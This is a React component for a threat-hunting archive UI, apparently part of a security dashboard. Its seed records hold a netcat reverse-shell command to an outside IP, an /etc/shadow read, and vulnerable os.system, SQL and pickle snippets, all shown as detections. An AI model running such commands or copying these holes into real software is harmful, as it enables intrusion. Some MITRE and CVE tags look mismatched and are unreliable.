import React, { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Archive, 
  Trash2, 
  Search, 
  Download, 
  ShieldAlert, 
  CheckCircle, 
  Clock, 
  User, 
  FileText, 
  FileJson, 
  Edit3, 
  Plus, 
  Lock, 
  RefreshCw, 
  ExternalLink,
  ChevronRight,
  Sparkles,
  AlertOctagon,
  LifeBuoy,
  X,
  Code,
  Terminal,
  Calendar,
  Filter,
  Share2,
  Crosshair,
  Bookmark,
  BookmarkCheck,
  ShieldCheck,
  Hash,
  Eye,
  RotateCcw,
  Sliders,
  Check,
  FileSpreadsheet
} from 'lucide-react';
import CryptoJS from 'crypto-js';
import { ArchivedThreat, ChainOfCustodyEntry } from '../types';
import ThreatIntegrityChecker from './ThreatIntegrityChecker';
import ForensicExportModal from './ForensicExportModal';
import IocExtractorModal from './IocExtractorModal';

// Generate dynamic initial seeds spanning recent hours, days and weeks
const generateInitialSeeds = (): ArchivedThreat[] => {
  const now = Date.now();
  return [
    {
      id: "arch-001",
      timestamp: new Date(now - 25 * 60 * 1000).toISOString(), // 25 mins ago (within 1H)
      category: "ebpf",
      name: "eBPF Root Escalation SUID Attempt",
      severity: "high",
      details: "Process 'backdoor_payload' triggered a setuid(0) system call. Forced sandbox termination occurred under standard enforcement constraints.",
      rawPayload: "syscall=setuid ppid=1209 pid=31411 comm=backdoor_payload args=uid=0(root) status=intercepted ip=192.168.1.100 host=c2.shadow-network.internal",
      status: "Unresolved",
      notes: "Critical. Parent PPID traces back to an unauthenticated TCP listener on port 8080. Machine isolate requested.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Privilege Escalation (TA0004)",
      mitreTechnique: "T1548.001 (SetUID and SetGID)",
      tags: ["rootkit", "c2", "ebpf-drop"],
      isBookmarked: true,
      chainOfCustody: [
        {
          investigator: "Aegis Kernel VMM Hook",
          action: "Process execution suspended and memory snapshot taken",
          timestamp: new Date(now - 24 * 60 * 1000).toISOString(),
          hashProof: "d8e8fca2dc0f896fd7cb4cb0031ba249"
        },
        {
          investigator: "baalbek.313@gmail.com",
          action: "Investigator assigned; host isolated at network perimeter firewall",
          timestamp: new Date(now - 15 * 60 * 1000).toISOString(),
          hashProof: "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d"
        }
      ],
      meta: {
        enclave_id: "SGX_MRENCLAVE_77a98c",
        kernel_version: "6.8.0-generic-aegis",
        ip: "192.168.1.100",
        hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      }
    },
    {
      id: "arch-002",
      timestamp: new Date(now - 3.5 * 3600 * 1000).toISOString(), // 3.5 hours ago (within 24H)
      category: "ast",
      name: "Command Execution Vulnerability in diagnostics.py",
      severity: "high",
      details: "AST parser identified dangerous os.system() command execution. Concatenation of user-supplied arguments creates high risk of Remote Code Execution (RCE).",
      rawPayload: "def backup_system(user_path):\n    # VULNERABLE DIRECT EXECUTION\n    os.system('tar -czf site_bak.tar.gz ' + user_path)",
      status: "Triaged",
      notes: "Assigned for immediate refactoring to use list-based subprocess.run with shell=False.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Execution (TA0002)",
      mitreTechnique: "T1059.006 (Python Subprocess)",
      tags: ["ast-scan", "rce", "cwe-78"],
      isBookmarked: false,
      chainOfCustody: [
        {
          investigator: "AST Heuristic Engine",
          action: "Static abstract syntax tree flagged unsafe string interpolation",
          timestamp: new Date(now - 3 * 3600 * 1000).toISOString(),
          hashProof: "4e9b8c7d6a5f3e2d1c0b9a8f7e6d5c4b"
        }
      ],
      meta: {
        heuristic_type: "os.system_concatenation",
        vulnerability_index: "CWE-78",
        cve: "CVE-2024-21626"
      }
    },
    {
      id: "arch-003",
      timestamp: new Date(now - 16 * 3600 * 1000).toISOString(), // 16 hours ago (within 24H)
      category: "ebpf",
      name: "Netcat Reverse Shell Spawned",
      severity: "high",
      details: "Telemetry hook intercepted Netcat launching an outbound TCP session on port 4444.",
      rawPayload: "syscall=execve pid=14209 ppid=14011 comm=nc args=-e /bin/sh 185.220.101.5 4444 status=vetted",
      status: "Remediated",
      notes: "Outbound socket intercepted. Port 4444 blocked globally inside iptables rules. Docker container recycled.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Command and Control (TA0011)",
      mitreTechnique: "T1071.001 (Web Protocols / Reverse Shell)",
      tags: ["reverse-shell", "netcat", "c2"],
      isBookmarked: true,
      chainOfCustody: [
        {
          investigator: "SecOps Perimeter Guard",
          action: "Container teardown executed; evidence payload sealed",
          timestamp: new Date(now - 15 * 3600 * 1000).toISOString(),
          hashProof: "5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c"
        }
      ],
      meta: {
        severity_score: 9.8,
        mitigation: "iptables drop rule added",
        ip: "185.220.101.5"
      }
    },
    {
      id: "arch-004",
      timestamp: new Date(now - 3 * 86400 * 1000).toISOString(), // 3 days ago (within 7D)
      category: "ast",
      name: "SQL Injection in auth_verifier.py",
      severity: "medium",
      details: "Un-parameterized database query executed. Dynamic local raw input concatenated directly inside SQLite runner query.",
      rawPayload: "conn.execute(f\"SELECT * FROM secret_hashes WHERE user_id = '{user_id}'\")",
      status: "False Positive",
      notes: "Code path confirmed to be inside offline local dev sandbox utility that handles non-client pre-compiled database tables. False Alarm flagged.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Defense Evasion (TA0005)",
      mitreTechnique: "T1027 (Obfuscated Files or Information)",
      tags: ["sql-injection", "cwe-89"],
      isBookmarked: false,
      chainOfCustody: [
        {
          investigator: "baalbek.313@gmail.com",
          action: "Audited local test fixture; marked as False Positive",
          timestamp: new Date(now - 2 * 86400 * 1000).toISOString(),
          hashProof: "3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d"
        }
      ],
      meta: {
        vulnerability_index: "CWE-89",
        target_db: "sqlite3"
      }
    },
    {
      id: "arch-005",
      timestamp: new Date(now - 14 * 86400 * 1000).toISOString(), // 14 days ago (within 30D)
      category: "ebpf",
      name: "Unauthorized /etc/shadow Read via sys_openat",
      severity: "high",
      details: "Anomalous ring-buffer probe caught unprivileged daemon attempting to open /etc/shadow credentials store.",
      rawPayload: "syscall=openat flags=O_RDONLY path=/etc/shadow pid=4891 ppid=1 comm=anomalous_daemon status=blocked",
      status: "Remediated",
      notes: "AppArmor sandbox profile enforced; credential rotation initiated across infrastructure.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Credential Access (TA0006)",
      mitreTechnique: "T1003.008 (/etc/passwd and /etc/shadow)",
      tags: ["credential-dump", "shadow", "ebpf-block"],
      isBookmarked: false,
      meta: {
        kernel_hook: "tracepoint/syscalls/sys_enter_openat",
        blocked_by: "eBPF LSM BPF_PROG_TYPE_LSM"
      }
    },
    {
      id: "arch-006",
      timestamp: new Date(now - 45 * 86400 * 1000).toISOString(), // 45 days ago (older historical record)
      category: "ast",
      name: "Insecure Deserialization via pickle.loads",
      severity: "medium",
      details: "Arbitrary code execution risk detected through uncontrolled pickle deserialization of untrusted incoming stream.",
      rawPayload: "data = pickle.loads(received_network_buffer)",
      status: "Remediated",
      notes: "Migrated serialization layer to strict JSON schema with cryptographic HMAC validation.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: "Initial Access (TA0001)",
      mitreTechnique: "T1190 (Exploit Public-Facing Application)",
      tags: ["deserialization", "cwe-502"],
      isBookmarked: false,
      meta: {
        vulnerability_index: "CWE-502",
        remediation_pr: "#144"
      }
    }
  ];
};

const SEED_THREATS = generateInitialSeeds();

const CATEGORY_OPTIONS = [
  { id: 'ebpf', label: 'eBPF Telemetry' },
  { id: 'ast', label: 'AST Static Scan' }
];

const SEVERITY_OPTIONS = [
  { id: 'high', label: 'Critical' },
  { id: 'medium', label: 'Medium' },
  { id: 'low', label: 'Low' }
];

const MITRE_TACTICS = [
  'ALL',
  'Initial Access (TA0001)',
  'Execution (TA0002)',
  'Privilege Escalation (TA0004)',
  'Defense Evasion (TA0005)',
  'Credential Access (TA0006)',
  'Command and Control (TA0011)'
];

type DateRangePreset = 'ALL' | '1H' | '24H' | '7D' | '30D' | 'CUSTOM';

export default function ThreatArchive() {
  const [threats, setThreats] = useState<ArchivedThreat[]>([]);
  const [selectedThreatId, setSelectedThreatId] = useState<string | null>(null);
  
  // Sorting parameter
  const [sortBy, setSortBy] = useState<'severity' | 'timestamp' | 'category'>('timestamp');

  // Unified Toast notification system
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const triggerToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 4000);
  };
  
  // Multi-select & AI report states
  const [selectedThreatIds, setSelectedThreatIds] = useState<string[]>([]);
  const [isAiReportModalOpen, setIsAiReportModalOpen] = useState(false);
  const [aiReportText, setAiReportText] = useState('');
  const [isAiLoading, setIsAiLoading] = useState(false);
  
  // Filtering and Searching parameters
  const [searchQuery, setSearchQuery] = useState('');
  const [isRegexMode, setIsRegexMode] = useState(false);
  const [regexError, setRegexError] = useState<string | null>(null);
  const [categoryFilters, setCategoryFilters] = useState<string[]>(['ebpf', 'ast']);
  const [severityFilters, setSeverityFilters] = useState<string[]>(['low', 'medium', 'high']);
  const [statusFilter, setStatusFilter] = useState<string>('ALL');
  const [mitreFilter, setMitreFilter] = useState<string>('ALL');

  // Date Range Filtering states
  const [datePreset, setDatePreset] = useState<DateRangePreset>('ALL');
  const [startDate, setStartDate] = useState<string>('');
  const [endDate, setEndDate] = useState<string>('');
  const [isCustomDateOpen, setIsCustomDateOpen] = useState(false);

  // Advanced Modals
  const [isExportModalOpen, setIsExportModalOpen] = useState(false);
  const [isIocModalOpen, setIsIocModalOpen] = useState(false);

  // Multi-select dropdown open states
  const [isCategoryDropdownOpen, setIsCategoryDropdownOpen] = useState(false);
  const [isSeverityDropdownOpen, setIsSeverityDropdownOpen] = useState(false);

  // Chain of custody addition form in detail pane
  const [isAddingCustody, setIsAddingCustody] = useState(false);
  const [custodyAction, setCustodyAction] = useState('');
  const [custodyOfficer, setCustodyOfficer] = useState('baalbek.313@gmail.com');

  // Defang toggle in detail payload box
  const [defangDetailPayload, setDefangDetailPayload] = useState(false);

  // Input states for registering a new manual mock incident entry
  const [isAddingNew, setIsAddingNew] = useState(false);
  const [newTitle, setNewTitle] = useState('');
  const [newCategory, setNewCategory] = useState<'ebpf' | 'ast'>('ebpf');
  const [newSeverity, setNewSeverity] = useState<'low' | 'medium' | 'high'>('high');
  const [newDetails, setNewDetails] = useState('');
  const [newRawPayload, setNewRawPayload] = useState('');
  const [newMitreTactic, setNewMitreTactic] = useState('Privilege Escalation (TA0004)');

  // Editing state for notes
  const [editingNotes, setEditingNotes] = useState<string>('');
  const [isEditingNotes, setIsEditingNotes] = useState(false);

  // Label helpers for multi-select selectors
  const categoryLabel = useMemo(() => {
    if (categoryFilters.length === CATEGORY_OPTIONS.length) return "All Sources";
    if (categoryFilters.length === 0) return "None Selected";
    return categoryFilters.map(c => CATEGORY_OPTIONS.find(opt => opt.id === c)?.label).join(', ');
  }, [categoryFilters]);

  const severityLabel = useMemo(() => {
    if (severityFilters.length === SEVERITY_OPTIONS.length) return "All Severities";
    if (severityFilters.length === 0) return "None Selected";
    return severityFilters.map(s => SEVERITY_OPTIONS.find(opt => opt.id === s)?.label).join(', ');
  }, [severityFilters]);

  // Syncing with localStorage
  useEffect(() => {
    const saved = localStorage.getItem('aegis_threat_archive');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          setThreats(parsed);
        } else {
          setThreats(SEED_THREATS);
          localStorage.setItem('aegis_threat_archive', JSON.stringify(SEED_THREATS));
        }
      } catch (e) {
        setThreats(SEED_THREATS);
      }
    } else {
      localStorage.setItem('aegis_threat_archive', JSON.stringify(SEED_THREATS));
      setThreats(SEED_THREATS);
    }
  }, []);

  const saveToStorage = (updatedList: ArchivedThreat[]) => {
    setThreats(updatedList);
    localStorage.setItem('aegis_threat_archive', JSON.stringify(updatedList));
    // Dispatch event to refresh the visual integrity fingerprint checker
    window.dispatchEvent(new Event('aegis_archive_modified'));
  };

  // Active threat selection
  const activeThreat = useMemo(() => {
    return threats.find(t => t.id === selectedThreatId) || null;
  }, [threats, selectedThreatId]);

  useEffect(() => {
    if (activeThreat) {
      setEditingNotes(activeThreat.notes || '');
      setIsEditingNotes(false);
      setIsAddingCustody(false);
    }
  }, [activeThreat]);

  // Note saving
  const handleSaveNotes = () => {
    if (!selectedThreatId) return;
    const updated = threats.map(t => {
      if (t.id === selectedThreatId) {
        return { ...t, notes: editingNotes };
      }
      return t;
    });
    saveToStorage(updated);
    setIsEditingNotes(false);
    triggerToast("Investigator notes persisted to encrypted archive");
  };

  // Status updates
  const handleUpdateStatus = (newStatus: ArchivedThreat['status']) => {
    if (!selectedThreatId) return;
    const updated = threats.map(t => {
      if (t.id === selectedThreatId) {
        return { ...t, status: newStatus };
      }
      return t;
    });
    saveToStorage(updated);
    triggerToast(`Incident status updated to ${newStatus}`);
  };

  // Bookmark toggle
  const handleToggleBookmark = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    const updated = threats.map(t => {
      if (t.id === id) {
        return { ...t, isBookmarked: !t.isBookmarked };
      }
      return t;
    });
    saveToStorage(updated);
  };

  // Add Chain of Custody Entry
  const handleAddCustodyRecord = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedThreatId || !custodyAction.trim()) return;

    const newEntry: ChainOfCustodyEntry = {
      investigator: custodyOfficer || 'baalbek.313@gmail.com',
      action: custodyAction.trim(),
      timestamp: new Date().toISOString(),
      hashProof: CryptoJS.SHA256(custodyAction + Date.now()).toString().substring(0, 32)
    };

    const updated = threats.map(t => {
      if (t.id === selectedThreatId) {
        const existing = t.chainOfCustody || [];
        return { ...t, chainOfCustody: [...existing, newEntry] };
      }
      return t;
    });

    saveToStorage(updated);
    setCustodyAction('');
    setIsAddingCustody(false);
    triggerToast("Cryptographic chain-of-custody entry sealed into evidence log");
  };

  // Deletion
  const handleDeleteThreat = (id: string) => {
    const updated = threats.filter(t => t.id !== id);
    saveToStorage(updated);
    if (selectedThreatId === id) {
      setSelectedThreatId(null);
    }
    triggerToast("Incident removed from local archive");
  };

  // Creation of manual alert
  const handleCreateNewThreat = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newTitle || !newDetails) return;

    const newThreat: ArchivedThreat = {
      id: `man-${Date.now()}`,
      timestamp: new Date().toISOString(),
      category: newCategory,
      name: newTitle,
      severity: newSeverity,
      details: newDetails,
      rawPayload: newRawPayload || "No payload debug stream registered.",
      status: "Unresolved",
      notes: "Manually registered forensic incident log.",
      assignedOfficer: "baalbek.313@gmail.com",
      mitreTactic: newMitreTactic,
      mitreTechnique: newMitreTactic.includes('Privilege') ? 'T1548' : newMitreTactic.includes('Execution') ? 'T1059' : 'T1190',
      tags: ["manual-entry", newCategory],
      isBookmarked: false,
      chainOfCustody: [
        {
          investigator: "baalbek.313@gmail.com",
          action: "Manual security specimen filed into durable vault",
          timestamp: new Date().toISOString(),
          hashProof: CryptoJS.SHA256(newTitle + Date.now()).toString().substring(0, 32)
        }
      ],
      meta: {
        origin: "Manual Forensic Log Filing",
        enclave_id: "SGX_MRENCLAVE_77a98c"
      }
    };

    const updated = [newThreat, ...threats];
    saveToStorage(updated);
    setSelectedThreatId(newThreat.id);
    setIsAddingNew(false);
    
    // Clear form inputs
    setNewTitle('');
    setNewDetails('');
    setNewRawPayload('');
    triggerToast("Manual alert filed with cryptographic hash proof");
  };

  const handleClearEverything = () => {
    if (confirm("Are you sure you want to permanently empty the local Threat Archive storage? This cannot be undone.")) {
      saveToStorage([]);
      setSelectedThreatId(null);
      triggerToast("Threat archive database purged");
    }
  };

  const handleResetToSeeds = () => {
    const refreshed = generateInitialSeeds();
    saveToStorage(refreshed);
    setSelectedThreatId(null);
    setSelectedThreatIds([]);
    setDatePreset('ALL');
    setStartDate('');
    setEndDate('');
    triggerToast("Loaded fresh default forensic specimens with relative timestamps");
  };

  const handleToggleSelectThreat = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (selectedThreatIds.includes(id)) {
      setSelectedThreatIds(selectedThreatIds.filter(tid => tid !== id));
    } else {
      setSelectedThreatIds([...selectedThreatIds, id]);
    }
  };

  const handleSelectAllVisible = () => {
    const visibleIds = filteredThreats.map(t => t.id);
    const allSelected = visibleIds.every(id => selectedThreatIds.includes(id));
    if (allSelected) {
      setSelectedThreatIds(selectedThreatIds.filter(id => !visibleIds.includes(id)));
    } else {
      const newSelected = [...selectedThreatIds];
      visibleIds.forEach(id => {
        if (!newSelected.includes(id)) {
          newSelected.push(id);
        }
      });
      setSelectedThreatIds(newSelected);
    }
  };

  const handleGenerateAiReport = async () => {
    if (selectedThreatIds.length === 0) return;
    
    setIsAiLoading(true);
    setAiReportText('');
    setIsAiReportModalOpen(true);
    
    try {
      const selectedThreatObjects = threats.filter(t => selectedThreatIds.includes(t.id));
      const response = await fetch('/api/gemini/summarize-threats', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ threats: selectedThreatObjects })
      });
      
      const data = await response.json();
      if (data.success && data.text) {
        setAiReportText(data.text);
      } else {
        setAiReportText(`### 🟥 Compilation Error\n\nFailed to compile AI summary report: ${data.error || 'Unknown response structure'}`);
      }
    } catch (err: any) {
      setAiReportText(`### 🟥 Connection Failure\n\nFailed to reach Aegis AI Coprocessor endpoint. Error: ${err.message}`);
    } finally {
      setIsAiLoading(false);
    }
  };

  // Date calculation helper
  const isWithinDateFilter = (timestampStr: string): boolean => {
    if (datePreset === 'ALL') return true;

    const time = new Date(timestampStr).getTime();
    const now = Date.now();

    if (datePreset === '1H') {
      return time >= now - 60 * 60 * 1000;
    }
    if (datePreset === '24H') {
      return time >= now - 24 * 60 * 60 * 1000;
    }
    if (datePreset === '7D') {
      return time >= now - 7 * 86400 * 1000;
    }
    if (datePreset === '30D') {
      return time >= now - 30 * 86400 * 1000;
    }
    if (datePreset === 'CUSTOM') {
      if (startDate) {
        const startMillis = new Date(startDate).getTime();
        if (time < startMillis) return false;
      }
      if (endDate) {
        const endMillis = new Date(endDate).getTime();
        if (time > endMillis) return false;
      }
      return true;
    }

    return true;
  };

  // Format relative timestamp helper
  const getRelativeTime = (isoString: string): string => {
    try {
      const millis = Date.now() - new Date(isoString).getTime();
      const seconds = Math.floor(millis / 1000);
      if (seconds < 60) return `${Math.max(1, seconds)}s ago`;
      const minutes = Math.floor(seconds / 60);
      if (minutes < 60) return `${minutes}m ago`;
      const hours = Math.floor(minutes / 60);
      if (hours < 24) return `${hours}h ago`;
      const days = Math.floor(hours / 24);
      if (days < 30) return `${days}d ago`;
      return new Date(isoString).toLocaleDateString();
    } catch {
      return isoString;
    }
  };

  // Process search filters with advanced date range and regex sorting
  const filteredThreats = useMemo(() => {
    let regexObj: RegExp | null = null;
    setRegexError(null);

    if (searchQuery && isRegexMode) {
      try {
        let pattern = searchQuery;
        let flags = 'i';
        if (searchQuery.startsWith('/') && searchQuery.lastIndexOf('/') > 0) {
          const lastSlash = searchQuery.lastIndexOf('/');
          pattern = searchQuery.substring(1, lastSlash);
          flags = searchQuery.substring(lastSlash + 1) || 'i';
        }
        regexObj = new RegExp(pattern, flags);
      } catch (err: any) {
        setRegexError(err.message || "Invalid regular expression");
        regexObj = null;
      }
    }

    const filtered = threats.filter(t => {
      // 1. Date window match
      if (!isWithinDateFilter(t.timestamp)) return false;

      // 2. MITRE ATT&CK filter
      if (mitreFilter !== 'ALL') {
        const tacticMatch = (t.mitreTactic || '').toLowerCase().includes(mitreFilter.toLowerCase());
        if (!tacticMatch) return false;
      }

      // 3. Category & Severity & Status
      const matchesCategory = categoryFilters.includes(t.category);
      const matchesSeverity = severityFilters.includes(t.severity);
      const matchesStatus = statusFilter === 'ALL' || t.status === statusFilter;
      if (!matchesCategory || !matchesSeverity || !matchesStatus) return false;

      // 4. Search query (Regex or substring)
      if (!searchQuery) return true;

      const searchableBlob = [
        t.name,
        t.details,
        t.rawPayload,
        t.notes || '',
        t.mitreTactic || '',
        t.mitreTechnique || '',
        ...(t.tags || [])
      ].join(' ');

      if (isRegexMode) {
        if (!regexObj) return true;
        return regexObj.test(searchableBlob);
      }

      return searchableBlob.toLowerCase().includes(searchQuery.toLowerCase());
    });

    const severityWeight: Record<string, number> = { high: 3, medium: 2, low: 1 };

    return [...filtered].sort((a, b) => {
      // Pinned / Bookmarked threats always stay prioritized
      if (a.isBookmarked && !b.isBookmarked) return -1;
      if (!a.isBookmarked && b.isBookmarked) return 1;

      if (sortBy === 'severity') {
        const diff = severityWeight[b.severity] - severityWeight[a.severity];
        if (diff !== 0) return diff;
        return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
      } else if (sortBy === 'category') {
        const diff = a.category.localeCompare(b.category);
        if (diff !== 0) return diff;
        return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
      } else {
        // default: newest timestamp first
        return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
      }
    });
  }, [
    threats, 
    searchQuery, 
    isRegexMode, 
    categoryFilters, 
    severityFilters, 
    statusFilter, 
    mitreFilter, 
    datePreset, 
    startDate, 
    endDate, 
    sortBy
  ]);

  const getSeverityLabel = (sev: string) => {
    switch (sev) {
      case 'high':
        return <span className="text-rose-400 font-bold tracking-wide text-[8px] bg-rose-950/30 px-1.5 py-0.5 border border-rose-900/40 rounded uppercase">CRITICAL</span>;
      case 'medium':
        return <span className="text-amber-300 font-bold tracking-wide text-[8px] bg-amber-955/30 px-1.5 py-0.5 border border-amber-900/40 rounded uppercase">MEDIUM</span>;
      default:
        return <span className="text-blue-400 font-bold tracking-wide text-[8px] bg-blue-950/30 px-1.5 py-0.5 border border-blue-900/40 rounded uppercase">LOW</span>;
    }
  };

  const getStatusLabel = (st: ArchivedThreat['status']) => {
    switch (st) {
      case 'Unresolved':
        return <span className="text-red-400 bg-red-950/20 px-2 py-0.5 rounded border border-red-900/40 text-[8.5px] uppercase font-bold tracking-wider">UNRESOLVED</span>;
      case 'Triaged':
        return <span className="text-[#00f0ff] bg-[#00f0ff]/10 px-2 py-0.5 rounded border border-[#00f0ff]/30 text-[8.5px] uppercase font-bold tracking-wider">TRIAGED</span>;
      case 'Remediated':
        return <span className="text-emerald-400 bg-emerald-950/20 px-2 py-0.5 rounded border border-emerald-900/45 text-[8.5px] uppercase font-bold tracking-wider">REMEDIATED</span>;
      case 'False Positive':
        return <span className="text-zinc-400 bg-zinc-900/20 px-2 py-0.5 rounded border border-zinc-800 text-[8.5px] uppercase font-bold tracking-wider">FALSE POSITIVE</span>;
    }
  };

  return (
    <div className="bg-[#0A0A0C]/95 border border-white/10 rounded-xl shadow-[0_8px_32px_rgba(0,0,0,0.5)] overflow-hidden font-mono text-[11px] grid grid-cols-1">
      {/* Top Header Bar */}
      <div className="border-b border-white/5 bg-gradient-to-r from-black/90 to-[#101015] px-5 py-4 flex flex-col md:flex-row md:items-center justify-between gap-3 select-none">
        <div className="flex items-center gap-2.5">
          <div className="p-2 border border-[#00f0ff]/35 bg-[#00f0ff]/5 text-[#00f0ff] rounded-lg shadow-[0_0_15px_rgba(0,240,255,0.15)]">
            <Archive size={16} />
          </div>
          <div>
            <div className="text-[9px] tracking-widest text-[#00f0ff]/90 uppercase font-bold flex items-center gap-1.5">
              FORENSIC THREAT ARCHIVE VAULT <Lock size={10} />
            </div>
            <h3 className="text-sm font-semibold text-zinc-100 flex items-center gap-1.5 leading-tight">
              Investigator Evidence Vault & Threat Hunting Ledger
            </h3>
          </div>
        </div>

        {/* Global Action Buttons */}
        <div className="flex items-center flex-wrap gap-2">
          {/* IOC Harvester Button */}
          <button
            type="button"
            onClick={() => setIsIocModalOpen(true)}
            className="px-3 py-1.5 bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 text-amber-300 rounded font-mono text-[9px] font-bold tracking-wider uppercase transition-all flex items-center gap-1.5 cursor-pointer shadow-[0_0_10px_rgba(251,191,36,0.1)]"
            title="Harvest & defang all IPs, hashes, domains, and syscalls from active logs"
          >
            <Crosshair size={12} /> Harvest IOCs
          </button>

          {/* Forensic Exporter Button */}
          <button
            type="button"
            onClick={() => setIsExportModalOpen(true)}
            className="px-3 py-1.5 bg-[#00f0ff]/10 hover:bg-[#00f0ff]/20 border border-[#00f0ff]/30 text-[#00f0ff] rounded font-mono text-[9px] font-bold tracking-wider uppercase transition-all flex items-center gap-1.5 cursor-pointer shadow-[0_0_10px_rgba(0,240,255,0.1)]"
            title="Export to STIX 2.1, CEF, Syslog RFC 5424, CSV or AES-256 Vault"
          >
            <Share2 size={12} /> Export Forensics
          </button>

          {/* Manual Alert Button */}
          <button
            type="button"
            onClick={() => setIsAddingNew(true)}
            className="px-3 py-1.5 bg-white/5 hover:bg-white/10 border border-white/10 text-zinc-200 rounded font-mono text-[9px] font-bold tracking-wider uppercase transition-all flex items-center gap-1.5 cursor-pointer"
          >
            <Plus size={12} /> File Manual Alert
          </button>
        </div>
      </div>

      {/* Date-Range Filter & Quick Time Windows Toolbar */}
      <div className="bg-[#050508] border-b border-white/5 px-4 py-2.5 flex flex-wrap items-center justify-between gap-3 select-none">
        <div className="flex items-center flex-wrap gap-1.5">
          <span className="text-[9px] text-zinc-400 font-bold uppercase flex items-center gap-1 mr-1">
            <Calendar size={12} className="text-[#00f0ff]" /> TIME WINDOW:
          </span>

          <button
            type="button"
            onClick={() => { setDatePreset('ALL'); setIsCustomDateOpen(false); }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all cursor-pointer ${
              datePreset === 'ALL'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            All Time
          </button>

          <button
            type="button"
            onClick={() => { setDatePreset('1H'); setIsCustomDateOpen(false); }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all cursor-pointer ${
              datePreset === '1H'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            1 Hour
          </button>

          <button
            type="button"
            onClick={() => { setDatePreset('24H'); setIsCustomDateOpen(false); }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all cursor-pointer ${
              datePreset === '24H'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            24 Hours
          </button>

          <button
            type="button"
            onClick={() => { setDatePreset('7D'); setIsCustomDateOpen(false); }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all cursor-pointer ${
              datePreset === '7D'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            7 Days
          </button>

          <button
            type="button"
            onClick={() => { setDatePreset('30D'); setIsCustomDateOpen(false); }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all cursor-pointer ${
              datePreset === '30D'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            30 Days
          </button>

          <button
            type="button"
            onClick={() => {
              setDatePreset('CUSTOM');
              setIsCustomDateOpen(!isCustomDateOpen);
            }}
            className={`px-2.5 py-1 rounded text-[9.5px] font-bold uppercase transition-all flex items-center gap-1 cursor-pointer ${
              datePreset === 'CUSTOM'
                ? 'bg-[#00f0ff] text-black shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'
            }`}
          >
            <Sliders size={11} /> Custom Range
          </button>
        </div>

        {/* Date Window Indicator */}
        <div className="text-[9.5px] text-zinc-400 flex items-center gap-2">
          <span>
            Matched in Window: <strong className="text-[#00f0ff]">{filteredThreats.length}</strong> / {threats.length} records
          </span>
          {(datePreset !== 'ALL' || startDate || endDate) && (
            <button
              type="button"
              onClick={() => {
                setDatePreset('ALL');
                setStartDate('');
                setEndDate('');
                setIsCustomDateOpen(false);
              }}
              className="text-rose-400 hover:underline text-[9px] uppercase font-bold flex items-center gap-0.5 cursor-pointer"
            >
              <RotateCcw size={10} /> Reset Time Filter
            </button>
          )}
        </div>
      </div>

      {/* Collapsible Custom Date Pickers Drawer */}
      <AnimatePresence>
        {isCustomDateOpen && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            className="overflow-hidden bg-[#07070B] border-b border-white/10 px-4 py-3"
          >
            <div className="flex flex-wrap items-center gap-4 text-[10px]">
              <div className="flex items-center gap-2">
                <span className="text-zinc-400 font-bold uppercase">START TIME:</span>
                <input
                  type="datetime-local"
                  value={startDate}
                  onChange={(e) => setStartDate(e.target.value)}
                  className="bg-black border border-white/10 hover:border-white/20 focus:border-[#00f0ff] rounded px-2.5 py-1 text-zinc-200 focus:outline-none"
                />
              </div>

              <div className="flex items-center gap-2">
                <span className="text-zinc-400 font-bold uppercase">END TIME:</span>
                <input
                  type="datetime-local"
                  value={endDate}
                  onChange={(e) => setEndDate(e.target.value)}
